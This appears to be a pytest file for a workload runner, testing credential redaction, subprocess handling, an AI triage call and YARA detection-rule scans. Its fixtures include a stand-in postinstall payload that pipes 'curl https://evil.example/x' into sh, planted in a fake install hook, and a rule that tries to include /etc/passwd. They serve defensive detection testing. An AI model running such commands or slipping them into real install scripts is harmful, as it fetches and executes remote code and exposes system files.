import io
import os
import json
import pytest
from numen_runner import workload

def test_native_credentials_never_enter_stdout_and_private_ingress_deleted(tmp_path,monkeypatch,capsys):
    monkeypatch.setattr(workload,"WORK",tmp_path)
    monkeypatch.setattr(workload,"PRIVATE",tmp_path/"private")
    monkeypatch.setattr(workload,"execute",lambda _: {"result":{"status":"ready"},"credential":{"auth_json":{"tokens":{"access_token":"sensitive-token-value"}}},"outputs":[]})
    monkeypatch.setattr(workload.sys,"stdin",io.TextIOWrapper(io.BytesIO(b'{}\n')))
    (tmp_path/'credential-ack').write_text('ok')
    workload.main()
    output=capsys.readouterr().out
    assert 'sensitive-token-value' not in output
    assert json.loads(output.splitlines()[0])=={"credential_ready":True}
    assert 'credential' not in json.loads(output.splitlines()[1])['envelope']
    assert not (tmp_path/'private'/'credential-ingress.json').exists()
    assert json.loads(output.splitlines()[1])['credential_updated'] is True


def test_run_process_without_deadline_waits_for_completion(tmp_path,monkeypatch):
    monkeypatch.setattr(workload,"WORK",tmp_path)
    code,out,_=workload.run_process([workload.sys.executable,"-c","import time;time.sleep(1.2);print('done')"],{},timeout=None)
    assert (code,out.strip())==(0,"done")


@pytest.mark.parametrize("error,message",[
    (ValueError("subprocess output exceeded byte limit"),"Subprocess output exceeded byte limit."),
    (KeyError("unexpected"),"Workload failed; required runtime or connection unavailable (KeyError)."),
])
def test_internal_failures_report_their_cause(tmp_path,monkeypatch,capsys,error,message):
    monkeypatch.setattr(workload,"WORK",tmp_path)
    monkeypatch.setattr(workload,"PRIVATE",tmp_path/"private")
    def fail(_):
        raise error
    monkeypatch.setattr(workload,"execute",fail)
    monkeypatch.setattr(workload.sys,"stdin",io.TextIOWrapper(io.BytesIO(b'{}\n')))
    try:
        workload.main()
    except SystemExit:
        pass
    failure=json.loads(capsys.readouterr().out.splitlines()[-1])["failure"]
    assert failure=={"code":"workload_failed","message":message}


def test_triage_returns_the_raw_reply_without_schema_validation(tmp_path, monkeypatch):
    """Triage is one tool-less call: its reply text is the result, and application code validates it."""
    monkeypatch.setattr(workload, "WORK", tmp_path)
    monkeypatch.setattr(workload, "setup_auth", lambda p, env: None)
    monkeypatch.setattr(workload, "capabilities", lambda p, env, timeout: {
        "status": "ready", "models": [{"id": "m", "reasoning_efforts": []}]})
    replies, calls = ["Not JSON, and no schema check here.", "Leaked synthetic-key-not-real"], []

    def run(argv, env, data=None, timeout=1800, max_bytes=0, events=None):
        calls.append((argv, data, timeout))
        return 0, json.dumps({"type": "result", "subtype": "success", "is_error": False, "result": replies[len(calls) - 1]}), ""

    monkeypatch.setattr(workload, "run_process", run)
    job = {"kind": "agent", "inputs": [], "prompt": "Triage this change.",
           "limits": {"input_bytes": 1024, "output_bytes": 1024, "timeout_seconds": 120},
           "output_schema": {"type": "object", "required": ["decision"]},
           "profile": {"agent": "claude", "provider_id": "claude", "auth_type": "api_key", "model_id": "m",
                       "operation": "commit_triage", "credential": {"api_key": "synthetic-key-not-real"}}}
    assert workload.execute(job) == {"result": {"reply": replies[0]}, "outputs": []}
    (argv, prompt, timeout), = calls
    assert argv[argv.index("--tools") + 1] == "" and timeout == 120
    assert prompt.endswith("You have no tools. Reply with only one JSON object matching the schema.")
    assert "result_json" not in prompt and '"required": ["decision"]' in prompt
    with pytest.raises(ValueError, match="credential material detected"):
        workload.execute(job)


RULE = 'rule postinstall_loader { strings: $a = "payload-ran" $b = "evil.example/x" condition: all of them }'
PAYLOAD = "node -e \"require('fs').writeFileSync('/workspace/outputs/payload-ran','')\" && curl -s https://evil.example/x | sh"


def detection_rule(tmp_path, monkeypatch, rule, trees, prepare=lambda root: None):
    """execute() for a detection_rule job, its rule and trees staged under inputs/ as the engine stages them."""
    monkeypatch.setattr(workload, "WORK", tmp_path)
    for path, data in {"rule.yar": rule, **{f"{tree}/{name}": data for tree, files in trees.items() for name, data in files.items()}}.items():
        (tmp_path / "inputs" / path).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / "inputs" / path).write_text(data)
    prepare(tmp_path / "inputs")
    return workload.execute({"kind": "detection_rule", "inputs": [], "inputs_materialized": True, "profile": {"agent": "codex"},
                             "output_schema": {"type": "object"}, "limits": {"input_bytes": 1 << 20, "output_bytes": 1 << 20, "timeout_seconds": 60}})


def test_detection_rule_workload_reports_matches_per_tree(tmp_path, monkeypatch):
    """A07: the real yara reads each tree sent. Paths are relative to their tree, a match list is capped
    at 1000 files with its full count, a tree that was not sent has no entry, and nothing is written."""
    many = {f"dist/{n:04}.js": PAYLOAD for n in range(1001)}
    result = detection_rule(tmp_path, monkeypatch, RULE, {
        "changed": {"scripts/install hook.sh": PAYLOAD, "README.md": "clean"},
        "parent": {**many, "README.md": "clean"}})
    assert result["outputs"] == []
    report = result["result"]
    assert (report["compiled"], report["error"], set(report["matches"])) == (True, None, {"changed", "parent"})
    assert report["matches"]["changed"] == {"files": ["scripts/install hook.sh"], "count": 1}
    assert report["matches"]["parent"] == {"files": sorted(many)[:1000], "count": 1001}


@pytest.mark.parametrize("rule,error", [
    ("rule broken { condition: ", "syntax error"),
    ('include "/etc/passwd"\n' + RULE, "include and the console module are not accepted"),
    ('import "console"\n' + RULE, "include and the console module are not accepted"),
    # yara accepts a comment before the module name and spells it from \xHH escapes.
    ('import /* log */ "\\x63ons\\x6fle"\n' + RULE, "include and the console module are not accepted"),
])
def test_detection_rule_workload_reports_a_rule_that_does_not_compile(tmp_path, monkeypatch, rule, error):
    """A rule that does not compile, or that would read other files or print lines a match prints,
    is reported as not compiled with its error, never raised, and no tree is scanned."""
    result = detection_rule(tmp_path, monkeypatch, rule, {"changed": {"package.json": PAYLOAD}})
    assert result["outputs"] == [] and result["result"]["compiled"] is False and "matches" not in result["result"]
    assert error in result["result"]["error"] and len(result["result"]["error"]) <= 500


@pytest.mark.skipif(os.geteuid() == 0, reason="root reads a file whatever its mode")
def test_a_detection_rule_scan_error_fails_the_run(tmp_path, monkeypatch):
    """yara reports a file it cannot read on stderr and still exits 0: that must fail the run, never
    read as 'no match', or a parent or Baseline check could pass falsely."""
    with pytest.raises(ValueError, match="Detection rule scan failed"):
        detection_rule(tmp_path, monkeypatch, RULE, {"changed": {"package.json": PAYLOAD}, "parent": {"package.json": PAYLOAD}},
                       prepare=lambda root: (root / "parent" / "package.json").chmod(0))
